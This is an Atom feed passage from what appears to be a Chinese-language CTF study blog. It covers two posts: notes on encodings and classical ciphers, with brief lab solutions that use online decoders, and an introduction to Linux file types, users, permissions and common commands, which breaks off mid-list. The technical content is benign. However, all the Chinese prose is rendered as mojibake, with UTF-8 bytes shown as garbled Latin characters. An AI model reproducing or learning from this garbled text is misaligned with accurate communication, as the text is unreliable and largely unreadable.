    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1 - å¤å…¸å¯†ç¢¼å­¸</a></label></li></ul><span id="more"></span><h2 id="crypto-1">Crypto 1 <a href="#crypto-1" class="headerlink"></a></h2><p><a href="https://cryptohack.org/">æ£’æ£’çš„ç·´ç¿’è³‡æº</a></p><ul><li>ç·¨ç¢¼</li><li>å¤å…¸å¯†ç¢¼</li><li>ç©¿æ’ã€Œã„§ã€é»æ•¸å­¸</li><li>æµåŠ å¯†</li><li>å°ç¨±å¼åŠ å¯†</li></ul><h3 id="å…ˆè£å¥—ä»¶">å…ˆè£å¥—ä»¶ <a href="#å…ˆè£å¥—ä»¶" class="headerlink"></a></h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></tbody></table></figure><h3 id="ä»€éº¼æ˜¯ç·¨ç¢¼">ä»€éº¼æ˜¯ç·¨ç¢¼ <a href="#ä»€éº¼æ˜¯ç·¨ç¢¼" class="headerlink"></a></h3><blockquote><p>ã€Œç·¨ç¢¼å™¨ï¼ˆè‹±èªï¼šEncoderï¼‰æ˜¯ä¸€ç¨®å°‡è³‡è¨Šç”±ä¸€ç¨®ç‰¹å®šæ ¼å¼è½‰æ›ç‚ºå…¶ä»–ç‰¹å®šæ ¼å¼çš„æ„Ÿæ¸¬å™¨ã€è»Ÿé«”æˆ–æ˜¯æ¼”ç®—æ³•ï¼Œè½‰æ›çš„ç›®çš„å¯èƒ½æ˜¯ç”±æ–¼æ¨™æº–åŒ–ã€é€Ÿåº¦ã€ä¿å¯†æ€§ã€ä¿å®‰æˆ–æ˜¯ç‚ºäº†å£“ç¸®è³‡æ–™ã€‚ã€â€”â€” ç¶­åŸºç™¾ç§‘</p></blockquote><figure><img data-src="https://i.imgur.com/H9jeJa0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ZDIXlGI.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/OFKzyLQ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="å¸¸è¦‹æ–‡å­—ç·¨ç¢¼">å¸¸è¦‹æ–‡å­—ç·¨ç¢¼ <a href="#å¸¸è¦‹æ–‡å­—ç·¨ç¢¼" class="headerlink"></a></h4><ul><li>ASCI<ul><li>ç”¨ä¸€å€‹ byteä¾†è¡¨ç¤ºå­—æ¯ã€æ•¸å­—ã€ç¬¦è™Ÿï¼Œæ˜¯é‡å°è‹±æ–‡è¨­è¨ˆçš„ï¼ŒUnicode çš„æœ€åˆ 128 å€‹å­—ç¬¦èˆ‡ ASCII å®Œå…¨ç›¸åŒ(å› ç‚ºåªæœ‰äº† 128 ç¨®å¯èƒ½ï¼Œæ‰€ä»¥æœ€å·¦é‚Šçš„ bit æ°¸é æ˜¯ 0)</li></ul></li><li>UTF-8<ul><li>ç”¨ 1~4 bytes ä¾†è¡¨ç¤ºä¸€å€‹å­—ç¬¦ï¼Œä¹ŸåŒ…å«äº† ASCII çš„å­—ç¬¦ï¼Œå› ç‚º ASCIIçš„å­—ç¬¦åªç”¨ 1 byte è¡¨ç¤ºï¼Œæ‰€ä»¥ UTF-8 èƒ½å®Œå…¨å…¼å®¹åŸå…ˆæ˜¯ ASCIIç·¨ç¢¼çš„æ–‡ä»¶</li><li>å®¹ç´äº†å„åœ‹èªè¨€ï¼Œç®—æ˜¯ Unicode çš„ä¸€ç¨®å¯¦ç¾æ–¹å¼</li></ul></li><li>HEX (16 é€²ä½)</li><li>Base64<ul><li>ç”¨ 64 å€‹å­—ç¬¦ä¾†è¡¨ç¤ºäºŒé€²ä½æ•¸æ“šï¼Œå¸¸ç”¨æ–¼åœ¨URLã€Cookieã€ç¶²é ä¸­å‚³è¼¸å°‘é‡äºŒé€²ä½æ•¸æ“šï¼Œå¸¸è¦‹ç·¨ç¢¼çµæœæœƒæœ‰ =, ==</li></ul></li></ul><h4 id="lab---complex-encoder">Lab - Complex Encoder <a href="#lab---complex-encoder" class="headerlink"></a></h4><p>è¦å…ˆç”¨ Base64 è§£ç¢¼ï¼Œå†ç”¨ HEX è§£ç¢¼</p><figure><img data-src="https://i.imgur.com/DDWsPyn.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="lab---fk-encoder">Lab - F**k Encoder <a href="#lab---fk-encoder" class="headerlink"></a></h4><p>ç”¨ BrainFuck å’Œ JSFuck éƒ½è©¦è©¦çœ‹ï¼Œç„¶å¾Œç™¼ç¾ç”¨ <a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">JSFuck</a> è§£å¯†Flag å°±å‡ºä¾†äº†</p><h3 id="å¤å…¸å¯†ç¢¼å­¸">å¤å…¸å¯†ç¢¼å­¸ <a href="#å¤å…¸å¯†ç¢¼å­¸" class="headerlink"></a></h3><h4 id="åŠ è§£å¯†çš„ç”¨é€”">åŠ è§£å¯†çš„ç”¨é€” <a href="#åŠ è§£å¯†çš„ç”¨é€”" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/0spEvIQ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å³ä¾¿è¢«æ””æˆªå¦‚æœåŠ è§£å¯†å¤ å¥½ï¼Œä¹Ÿèƒ½ç¢ºä¿å¯†æ–‡ä¸è¢«ç ´è­¯</p><h4 id="å¸¸è¦‹çš„åŠ è§£å¯†">å¸¸è¦‹çš„åŠ è§£å¯† <a href="#å¸¸è¦‹çš„åŠ è§£å¯†" class="headerlink"></a></h4><ul><li>å‡±è–©å¯†ç¢¼<ul><li>ROT13</li><li>æ›¹æ“å¯†ç¢¼</li></ul></li><li>ç°¡æ˜“æ›¿æ›å¯†ç¢¼<ul><li><figure><img data-src="https://i.imgur.com/WHjuU9j.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li>è§£å¯†æ–¹å¼ï¼šé »ç‡åˆ†æ</li><li><figure><img data-src="https://i.imgur.com/MjPl9kx.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li></ul></li><li>ç¶­å‰å°¼äºå¯†ç¢¼ï¼ˆVigenereï¼‰<ul><li><figure><img data-src="https://i.imgur.com/cxikvpz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li><figure><img data-src="https://i.imgur.com/sbkAIfj.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li>ç”¨å¯†é‘°é•·åº¦åˆ‡åˆ†ï¼Œæ¯ä¸€æ®µç›¸åŒä½ç½®çš„åç§»é‡æœƒç›¸åŒ (ä¾‹å¦‚ä¸Šåœ–çš„ CSASTPK çš„ Kå’Œ CSASTPI çš„ I åŒæ¨£éƒ½æ˜¯å‘å³åç§»å…©æ ¼)ï¼Œé€™æ¨£å°±èƒ½åˆ†åˆ¥å°ç›¸åŒä½ç½®çš„å­—å¹•åšé »ç‡åˆ†æ</li></ul></li><li>æ³¢é›·è²»å¯†ç¢¼ (Playfair)<ul><li><figure><img data-src="https://i.imgur.com/I15FDJ3.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li></ul></li><li>æŸµæ¬„å¯†ç¢¼ (Rail fence)<ul><li><figure><img data-src="https://i.imgur.com/NwrUS0z.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li>å¯†é‘°æ˜¯æœ‰å¹¾å€‹ <code>_</code></li></ul></li></ul><h4 id="lab---vigenere-cipher">Lab - vigenere cipher <a href="#lab---vigenere-cipher" class="headerlink"></a></h4><p><a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">ç·šä¸Šè§£å¯†å·¥å…·</a></p><p>ç„¶å¾Œæ‰¾äº†ä¸€ä¸‹å°±ç™¼ç¾äº†ä¸€å€‹çœ‹èµ·ä¾†åƒæ­£ç¢º flag çš„å­—ä¸²</p><figure><img data-src="https://i.imgur.com/BK3rebA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="lab---secure-substitution">Lab - secure substitution <a href="#lab---secure-substitution" class="headerlink"></a></h4><p><a href="secure%20substitution">ç·šä¸Šè§£å¯†å·¥å…·</a></p><p>ä¸Ÿä¸Šå»è·‘å‡ºä¾†çš„ç¬¬ä¸€å€‹å°±æ˜¯ Flag äº†</p><figure><img data-src="https://i.imgur.com/beCSHYP.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto
1 - å¤å…¸å¯†ç¢¼å­¸&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day26</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day26/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day26/</id>
    <published>2024-09-28T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></label></li></ul><span id="more"></span><h2 id="linux-åŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†">Linux åŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç† <a href="#linux-åŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†" class="headerlink"></a></h2><figure><img data-src="https://i.imgur.com/crswIVm.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="kernel-space-vs-user-space">Kernel Space vs User Space <a href="#kernel-space-vs-user-space" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/Cmt2y72.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å€åˆ†æˆé€™æ¨£æ˜¯ç‚ºäº†è®“ Kernel æ–¹ä¾¿ç®¡ç† User Space çš„ Applicationï¼Œé¿å…æœ‰äº› Application æ¶è³‡æºï¼Œé€™æ™‚å€™å°±å¯ä»¥ç”± Kernel Spaceåœæ­¢é‚£äº›æŒ‡ä»¤é‹è¡Œ</p><h3 id="shell">Shell <a href="#shell" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RFSND8t.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ssh">SSH <a href="#ssh" class="headerlink"></a></h3><p>Secure Shell Protocol</p><figure><img data-src="https://i.imgur.com/L8lFFSA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://blog.gtwang.org/linux/linux-ssh-public-key-authentication/">SSHé‡‘é‘°ç™»å…¥ å°±ä¸ç”¨æ‰“å¯†ç¢¼äº†</a></p><h3 id="linux-ç›®éŒ„æ¶æ§‹">Linux ç›®éŒ„æ¶æ§‹ <a href="#linux-ç›®éŒ„æ¶æ§‹" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/aIJTb9C.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="æª”æ¡ˆç¨®é¡">æª”æ¡ˆç¨®é¡ <a href="#æª”æ¡ˆç¨®é¡" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/2dh0cQk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="æ­£è¦æª”æ¡ˆ-regular-file">æ­£è¦æª”æ¡ˆ (Regular File) <a href="#æ­£è¦æª”æ¡ˆ-regular-file" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼š<code>-</code></li><li>ç´”æ–‡å­—æª” (ASCII)ã€äºŒé€²ä½æª” (binary)ã€è³‡æ–™æ ¼å¼æª” (data)</li></ul><h4 id="ç›®éŒ„-directory">ç›®éŒ„ (Directory) <a href="#ç›®éŒ„-directory" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼š<code>d</code></li><li>å°±æ˜¯ç›®éŒ„</li></ul><h4 id="é€£çµæª”link">é€£çµæª” (link) <a href="#é€£çµæª”link" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼š<code>l</code></li><li>å°±åŒæ–¼ Windows ä¸‹çš„æ·å¾‘</li></ul><h4 id="è¨­å‚™èˆ‡è£ç½®æª”device">è¨­å‚™èˆ‡è£ç½®æª” (device) <a href="#è¨­å‚™èˆ‡è£ç½®æª”device" class="headerlink"></a></h4><ul><li>å€å¡Š (block) è¨­å‚™æª”<ul><li>æª”æ¡ˆé¡å‹ï¼šb</li><li>ç¡¬ç¢Ÿæˆ–å„²å­˜è¨­å‚™</li></ul></li><li>å­—å…ƒ (character) è¨­å‚™æª”<ul><li>æª”æ¡ˆé¡å‹ï¼šc</li><li>éµç›¤ã€æ»‘é¼ ç­‰</li></ul></li></ul><h4 id="è³‡æ–™æ¥å£æª”sockets">è³‡æ–™æ¥å£æª” (sockets) <a href="#è³‡æ–™æ¥å£æª”sockets" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼šs</li><li>è®“å…©å€‹ç¨‹å¼åšæºé€šï¼Œè®“ä¸€å€‹ç¨‹å¼æŠŠè³‡æ–™çŒé€² sockets ï¼Œå¦ä¸€å€‹ç¨‹å¼å°±å¯ä»¥å¾sockets æ‹¿è³‡æ–™</li></ul><h4 id="è³‡æ–™è¼¸é€æª”fifo-pipe">è³‡æ–™è¼¸é€æª” (FIFO, pipe) <a href="#è³‡æ–™è¼¸é€æª”fifo-pipe" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼šp</li><li>è®“ä¸åŒé€²ç¨‹é–“èƒ½æºé€š</li></ul><h3 id="ç”¨æˆ¶èˆ‡ç¾¤çµ„">ç”¨æˆ¶èˆ‡ç¾¤çµ„ <a href="#ç”¨æˆ¶èˆ‡ç¾¤çµ„" class="headerlink"></a></h3><p>ç”¨æˆ¶ï¼šå°±ç”¨æˆ¶<br>ç¾¤çµ„ï¼šä¸»ç¾¤çµ„å’Œé™„åŠ ç¾¤çµ„</p><h4 id="ç”¨æˆ¶-etcpassword">ç”¨æˆ¶ /etc/password <a href="#ç”¨æˆ¶-etcpassword" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/7j0LQsL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¯†ç¢¼ä¸æœƒå­˜åœ¨é€™ï¼Œæ‰€ä»¥ä¸Šé¢æ˜¯å¯« <code>x</code></p><h4 id="ç”¨æˆ¶-etcshadow">ç”¨æˆ¶ /etc/shadow <a href="#ç”¨æˆ¶-etcshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/VBwPnAJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç¾¤çµ„-etcgroup">ç¾¤çµ„ /etc/group <a href="#ç¾¤çµ„-etcgroup" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/x6EP4D5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç¾¤çµ„-etcgshadow">ç¾¤çµ„ /etc/gshadow <a href="#ç¾¤çµ„-etcgshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/cb7ZUgf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="æ¬Šé™">æ¬Šé™ <a href="#æ¬Šé™" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/uYL8Ucw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç›®éŒ„çš„æ¬Šé™">ç›®éŒ„çš„æ¬Šé™ <a href="#ç›®éŒ„çš„æ¬Šé™" class="headerlink"></a></h4><blockquote><p>r ï¼š<br><br>è¡¨ç¤ºå…·æœ‰è®€å–ç›®éŒ„çµæ§‹æ¸…å–®çš„æ¬Šé™ï¼Œå¯ä»¥æŸ¥è©¢è©²ç›®éŒ„ä¸‹çš„æª”åè³‡æ–™ã€‚<br><br>w ï¼š<br><br>å»ºç«‹æ–°çš„æª”æ¡ˆèˆ‡ç›®éŒ„ï¼›<br><br>åˆªé™¤å·²ç¶“å­˜åœ¨çš„æª”æ¡ˆèˆ‡ç›®éŒ„ (ä¸è«–è©²æª”æ¡ˆçš„æ¬Šé™ç‚ºä½•ï¼)<br><br>å°‡å·²å­˜åœ¨çš„æª”æ¡ˆæˆ–ç›®éŒ„é€²è¡Œæ›´åï¼›<br><br>æ¬ç§»è©²ç›®éŒ„å…§çš„æª”æ¡ˆã€ç›®éŒ„ä½ç½®ã€‚<br><br>x (access directory)ï¼š<br><br>ä½¿ç”¨è€…èƒ½å¦é€²å…¥è©²ç›®éŒ„æˆç‚ºå·¥ä½œç›®éŒ„çš„ç”¨é€”ï¼ˆèƒ½å¦ cd é€²å…¥ï¼‰<br></p></blockquote><figure><img data-src="https://i.imgur.com/WrkLjvg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç‰¹æ®Šæ¬Šé™-suidsgidsbit">ç‰¹æ®Šæ¬Šé™ SUID/SGID/SBIT <a href="#ç‰¹æ®Šæ¬Šé™-suidsgidsbit" class="headerlink"></a></h4><blockquote><p>SUIDï¼šåŸ·è¡Œæ™‚ç›¸ç•¶æ–¼æ“æœ‰æª”æ¡ˆ owner çš„æ¬Šé™ï¼Œåƒ…å°æª”æ¡ˆç”Ÿæ•ˆ<br><br>SGIDï¼š<br><br>å°æª”æ¡ˆè¨­å®šï¼šåŸ·è¡Œæ™‚ç›¸ç•¶æ–¼æ“æœ‰æª”æ¡ˆ group çš„æ¬Šé™<br><br>å°ç›®éŒ„è¨­å®šï¼šæ­¤ç›®éŒ„ä¸‹çš„æœ‰æ•ˆç¾¤çµ„ (effectivegroup) å°‡æœƒè®Šæˆè©²ç›®éŒ„çš„ç¾¤çµ„<br><br>SBITï¼šåƒ…èƒ½å°ç›®éŒ„è¨­å®šï¼Œä½¿ç”¨è€…åœ¨è©²ç›®éŒ„ä¸‹å»ºç«‹æª”æ¡ˆæˆ–ç›®éŒ„æ™‚ï¼Œåƒ…æœ‰è‡ªå·±èˆ‡ rootæ‰æœ‰æ¬ŠåŠ›åˆªé™¤è©²æª”æ¡ˆ<br><br>SUID = 4 SGID = 2 SBIT = 1 _755</p></blockquote><figure><img data-src="https://i.imgur.com/sixviML.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="umask">Umask <a href="#umask" class="headerlink"></a></h4><p>ä»–çš„å€¼æœƒæ˜¯ 777 æ¸›å» umask çš„å€¼ï¼Œæ‰€ä»¥å¦‚æœ umask æ˜¯ 022 çš„è©±ï¼Œé‚£å°±æ˜¯755</p><p><code>-S</code>: é¡¯ç¤ºæˆæ¯”è¼ƒå¥½æª¢è¦–çš„æ¨£å­</p><figure><img data-src="https://i.imgur.com/z3UIhku.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="æœªçŸ¥çš„æŒ‡ä»¤">æœªçŸ¥çš„æŒ‡ä»¤ <a href="#æœªçŸ¥çš„æŒ‡ä»¤" class="headerlink"></a></h3><ul><li>Google</li><li><code>man xxx</code></li><li><code>xxx -h</code> / <code>xxx --help</code></li></ul><h3 id="å¸¸è¦‹æŒ‡ä»¤">å¸¸è¦‹æŒ‡ä»¤ <a href="#å¸¸è¦‹æŒ‡ä»¤" class="headerlink"></a></h3><ul><li><code>cd</code>: change directory (å¯ç”¨çµ•å°è·¯å¾‘æˆ–ç›¸å°è·¯å¾‘)</li><li><code>pwd</code>: print working directory</li><li><code>ls</code>: list<ul><li><code>-a</code>: é¡¯ç¤ºéš±è—æª”</li><li><code>-l</code>: é¡¯ç¤ºè©³ç´°è³‡è¨Š (<code>ll</code> æ˜¯ <code>ls -l</code>çš„ç¸®å¯«)</li></ul></li><li><code>exa</code>: è·Ÿ <code>ls</code> é¡ä¼¼ï¼Œä½†æ˜¯æœ‰é¡è‰²</li><li><code>rm</code>: remove<ul><li><code>-r</code>: éè¿´åˆªé™¤</li><li><code>-f</code>: å¼·åˆ¶åˆªé™¤</li></ul></li><li><code>cp</code>: copy</li><li><code>mv</code>: move</li><li><code>cat</code>: concatenate</li><li><code>tac</code>: åå‘é¡¯ç¤º</li><li><code>od</code>: octal dump</li><li><code>nl</code>: number lines (æœƒæŠŠæª”æ¡ˆçš„æ¯ä¸€è¡Œç·¨è™Ÿ)</li><li><code>more</code>: ä¸€æ¬¡é¡¯ç¤ºä¸€é </li><li><code>less</code>: ä¹Ÿæ˜¯ä¸€æ¬¡é¡¯ç¤ºä¸€é ï¼Œä½†æ˜¯å¯ä»¥å¾€å‰ç¿» (vimçš„æ“ä½œæ–¹å¼)</li><li><code>mkdir</code>: make directory</li><li><code>touch</code>: å»ºç«‹æª”æ¡ˆ</li><li><code>rmdir</code>: remove directory</li><li><code>nano</code>: ç·¨è¼¯å™¨</li><li><code>vi</code>: å¾ˆæ£’çš„ç·¨è¼¯å™¨</li><li><code>vim</code>: æ›´æ£’çš„ç·¨è¼¯å™¨</li><li><code>chmod</code>: change mode<ul><li><code>chmod 777 xxx</code>: ä¸‰å€‹æ•¸å­—åˆ†åˆ¥ä»£è¡¨user/group/othersï¼Œæ¯å€‹æ•¸å­—ä»£è¡¨ rwxï¼Œæ‰€ä»¥ 777 å°±æ˜¯å…¨éƒ¨éƒ½æœ‰ rwx</li><li><code>chmod -x xxx</code>: ç§»é™¤æ‰€æœ‰äººå° xxx çš„åŸ·è¡Œæ¬Šé™</li><li><code>chmod +x xxx</code>: çµ¦æ‰€æœ‰äººå° xxx çš„åŸ·è¡Œæ¬Šé™</li><li><code>chmod u+x xxx</code>: çµ¦ user å° xxx çš„åŸ·è¡Œæ¬Šé™ (u = user, g =group, o = others, a = all)</li><li>ä¹Ÿå¯è¨­å®š SUID/SGID/SBIT å¯ä»¥ç”¨ <code>chmod 4755 xxx</code> ä¾†è¨­å®šSUID ï¼Œç„¶å¾Œ<code>+s</code> ä¾†è¨­å®š SUID / SGIDï¼Œ<code>+t</code> ä¾†è¨­å®šSBIT</li></ul></li><li><code>chown</code>: change owner<ul><li><code>chown user xxx</code>: æŠŠ xxx çš„ owner æ”¹æˆ user</li><li><code>chown user:group xxx</code>: æŠŠ xxx çš„ owner æ”¹æˆ userï¼Œgroupæ”¹æˆ group</li></ul></li><li><code>chgrop</code>: change group<ul><li><code>chgrp group xxx</code>: æŠŠ xxx çš„ group æ”¹æˆ group</li></ul></li><li><code>chattr</code>: change attribute<ul><li><code>chattr +i xxx</code>: è®“ xxx è®Šæˆä¸å¯åˆªé™¤</li><li><code>chattr +a xxx</code>: è®“ xxx è®Šæˆåªèƒ½å¢åŠ è³‡æ–™ï¼Œä¸èƒ½åˆªé™¤</li><li>å…¶ä»–ä¸å¸¸ç”¨éœ€è¦å†çœ‹</li></ul></li><li><code>lsattr</code>: é¡¯ç¤ºæª”æ¡ˆå±¬æ€§</li><li><code>passwd</code>: æ›´æ”¹å¯†ç¢¼</li><li><code>which</code> / <code>whereis</code>: æ‰¾æŒ‡ä»¤çš„ä½ç½®</li><li><code>tar</code>: åŒ…è£ or å£“ç¸®æª”æ¡ˆ<ul><li><code>v</code>: é¡¯ç¤ºè©³ç´°è³‡è¨Š</li><li><code>f</code>: æª”æ¡ˆåç¨±</li><li><code>c</code>: å»ºç«‹å£“ç¸®æª”</li><li><code>j</code>: ç”¨ bzip2 å£“ç¸®</li><li><code>z</code>: ç”¨ gzip å£“ç¸®</li><li><code>J</code>: ç”¨ xz å£“ç¸®</li><li><code>x</code>: è§£å£“ç¸®</li><li><code>tar -cvf xxx.tar xxx</code>: å£“ç¸®</li><li><code>tar -xvf xxx.tar</code>: è§£å£“ç¸®</li><li><code>tar -zcvf xxx.tar.gz xxx</code>: å£“ç¸®æˆ .tar.gz</li><li><code>tar -zxvf xxx.tar.gz</code>: è§£å£“ç¸® .tar.gz</li></ul></li><li>pipe: <code>|</code>ï¼ŒæŠŠå‰é¢çš„çµæœå‚³çµ¦å¾Œé¢<ul><li>ä¾‹å¦‚ <code>ls | grep xxx</code> å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœå‚³çµ¦<code>grep</code> ä¾†æ‰¾ <code>xxx</code></li></ul></li><li><code>sleep</code>: æœƒæš«åœå¾Œé¢æ¥çš„ç§’æ•¸</li><li>ä¸€äº›ç‰¹æ®Š combo<ul><li><code>Ctrl+C</code>: ä¸­æ–·ç›®å‰çš„æŒ‡ä»¤</li><li><code>Ctrl+Z</code>: æš«åœç›®å‰çš„æŒ‡ä»¤ (suspended)<ul><li><code>jobs</code>: æŸ¥çœ‹æš«åœçš„æŒ‡ä»¤</li><li><code>fg</code>: æŠŠæš«åœçš„æŒ‡ä»¤æ¢å¾© (åˆ©ç”¨ <code>%{number}</code>ä¾†æŒ‡å®šè¦æ¢å¾© jobs ä¸­æŒ‡ä»¤çš„ç·¨è™Ÿ)</li><li><code>bg</code>: æŠŠæš«åœçš„æŒ‡ä»¤è®ŠæˆèƒŒæ™¯åŸ·è¡Œ</li></ul></li><li><code>Ctrl+D</code>: EOF</li></ul></li><li>redirect:<code>&gt;</code>ï¼ŒæŠŠå‰é¢çš„çµæœå¯«åˆ°å¾Œé¢çš„æª”æ¡ˆï¼Œ<code>&gt;&gt;</code> æ˜¯appendï¼Œ <code>&lt;</code> æ˜¯æŠŠæª”æ¡ˆçš„å…§å®¹å‚³çµ¦å¾Œé¢çš„æŒ‡ä»¤<ul><li><code>ls &gt; xxx.txt</code> 